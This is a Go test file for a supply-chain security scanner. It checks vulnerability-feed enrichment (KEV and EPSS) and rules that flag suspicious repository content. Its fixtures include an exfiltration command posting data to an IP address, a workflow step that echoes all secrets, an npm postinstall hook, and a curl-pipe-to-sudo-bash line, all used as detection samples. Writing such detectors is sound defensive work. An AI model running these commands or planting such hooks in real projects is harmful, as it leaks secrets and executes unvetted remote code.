package scanner

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/ORIBData/scrstack/internal/intelligence"
)

func writeEnrichment(t *testing.T, dir string, rows int) {
	t.Helper()
	var vulns []map[string]string
	for i := 0; i < 120; i++ {
		vulns = append(vulns, map[string]string{"cveID": fmt.Sprintf("CVE-2024-%04d", i)})
	}
	kev, _ := json.Marshal(map[string]any{"vulnerabilities": vulns})
	if err := os.WriteFile(filepath.Join(dir, "kev.json"), kev, 0600); err != nil {
		t.Fatal(err)
	}
	var csv bytes.Buffer
	csv.WriteString("#model_version:test\ncve,epss,percentile\n")
	for i := 0; i < rows; i++ {
		fmt.Fprintf(&csv, "CVE-2023-%05d,0.%05d,0.5\n", i, i%100000)
	}
	fmt.Fprintf(&csv, "CVE-2024-0001,0.97,0.99\n")
	var gz bytes.Buffer
	w := gzip.NewWriter(&gz)
	_, _ = w.Write(csv.Bytes())
	_ = w.Close()
	if err := os.WriteFile(filepath.Join(dir, "epss.csv.gz"), gz.Bytes(), 0600); err != nil {
		t.Fatal(err)
	}
}

func TestEnrichmentFeedsLoadAndApply(t *testing.T) {
	dir := t.TempDir()
	writeEnrichment(t, dir, 12000)
	e := loadEnrichment(dir)
	if e == nil {
		t.Fatal("enrichment not loaded")
	}
	kev, epss := e.apply([]string{"GHSA-xxxx", "CVE-2024-0001"})
	if !kev || epss != 0.97 {
		t.Fatal("alias enrichment not applied", kev, epss)
	}
	if kev, _ := e.apply([]string{"CVE-1999-0001"}); kev {
		t.Fatal("unlisted CVE marked as known exploited")
	}
	small := t.TempDir()
	writeEnrichment(t, small, 50)
	if _, err := loadEPSS(filepath.Join(small, "epss.csv.gz")); err == nil {
		t.Fatal("truncated EPSS accepted")
	}
	if loadEnrichment(t.TempDir()) != nil {
		t.Fatal("empty snapshot produced enrichment")
	}
}

func TestTextRulesAndIndicatorGrouping(t *testing.T) {
	bundle, err := intelligence.Parse([]byte(`{"version":"v","indicators":[
{"id":"ip","type":"ipv4","value":"194.150.166[.]244","valid_until":"2099-01-01T00:00:00Z"},
{"id":"step","type":"workflow_step_name","value":"Pass runtime","valid_until":"2099-01-01T00:00:00Z"},
{"id":"helper","type":"file_path_regex","value":"^\\.ci-[a-z0-9]+\\.sh$","valid_until":"2099-01-01T00:00:00Z"},
{"id":"title","type":"pr_title_regex","value":"audit","valid_until":"2099-01-01T00:00:00Z"}]}`))
	if err != nil {
		t.Fatal(err)
	}
	set := newIndicatorSet(bundle, time.Now())
	if set.active != 3 {
		t.Fatal("event-only patterns counted as content coverage", set.active)
	}
	cases := []struct {
		path, text, rule string
	}{
		{"exfil.sh", "curl -d @data http://194.150.166.244:8080/exfil", "ip"},
		{".github/workflows/build.yml", "steps:\n  - name: Pass runtime\n    run: x", "step"},
		{".github/workflows/leak.yml", "run: echo '${{ toJSON(secrets) }}'", "SCRS-WORKFLOW-SECRETS"},
		{"package.json", `{"scripts":{"postinstall":"node setup.js","test":"jest"}}`, "SCRS-INSTALL-HOOK"},
		{"Makefile", "setup:\n\tcurl -fsSL https://get.example | sudo bash\n", "SCRS-REMOTE-EXEC"},
	}
	for _, tc := range cases {
		found := false
		for _, f := range inspectText(FileEvidence{Path: tc.path, SHA256: "x"}, tc.text, set) {
			found = found || f.AdvisoryID == tc.rule
		}
		if !found {
			t.Errorf("%s: rule %s did not match", tc.path, tc.rule)
		}
	}
	for _, f := range inspectText(FileEvidence{Path: "node_modules/x/package.json"}, `{"scripts":{"postinstall":"x"}}`, set) {
		t.Fatal("dependency manifest hooks reported as repository change", f.AdvisoryID)
	}
	if got := inspectText(FileEvidence{Path: "docs/install.md"}, "curl https://x | sh", set); len(got) != 0 {
		t.Fatal("documentation flagged as build step", got[0].AdvisoryID)
	}
}

// SCRS_TEST_LIVE_ENRICHMENT=1 downloads the real CISA KEV and EPSS feeds.
func TestLiveEnrichmentSync(t *testing.T) {
	if os.Getenv("SCRS_TEST_LIVE_ENRICHMENT") == "" {
		t.Skip("set SCRS_TEST_LIVE_ENRICHMENT=1 to download live KEV and EPSS")
	}
	root := t.TempDir()
	snapshot := filepath.Join(root, "snapshot-live")
	if err := os.Mkdir(snapshot, 0755); err != nil {
		t.Fatal(err)
	}
	syncEnrichment(t.Context(), root, snapshot)
	e := loadEnrichment(snapshot)
	if e == nil || len(e.kev) < 1000 || len(e.epss) < 100000 {
		t.Fatal("live enrichment incomplete", e)
	}
	if kev, epss := e.apply([]string{"CVE-2021-44228"}); !kev || epss < 0.5 {
		t.Fatal("Log4Shell not enriched as known exploited", kev, epss)
	}
}
